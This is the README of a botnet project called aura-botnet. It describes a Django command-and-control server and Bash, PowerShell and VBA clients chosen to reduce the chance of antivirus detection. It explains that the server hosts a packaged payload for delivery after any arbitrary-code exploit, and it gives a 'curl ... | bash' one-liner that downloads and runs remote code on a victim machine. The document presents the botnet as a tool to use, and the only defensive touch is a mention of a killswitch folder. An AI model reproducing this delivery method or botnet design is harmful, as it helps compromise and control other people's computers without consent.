# aura-botnet

Overview
---
Aura is a botnet utilizing Django as the backend because of its
portability. It is currently configured with a simple setup for mysql
but can easily be configured for sqlite or postgresql thanks to Django.

The clients will be written in Bash, Powershell, and VBA for guaranteed
compatibility on their respective operating systems, as well as a
significantly decreased chance of detection by the bot's antivirus.

Client Web Delivery
---
The *static* folder contains files to be served by a web server, preferably
nginx which serves static files very efficiently. It contains the packged
payload and a script that can easily be called from a command line. This
makes it easy to use it with any exploit that can run arbitrary code. An example
would be:

```
curl http://server-name/welcome/linux/ | bash
```

Misc.
---
The *Killswitch* folder contains scripts for easy removal.

<b>*This is currently a repo for testing, so several files will be configured to run or communicate on localhost*</b>
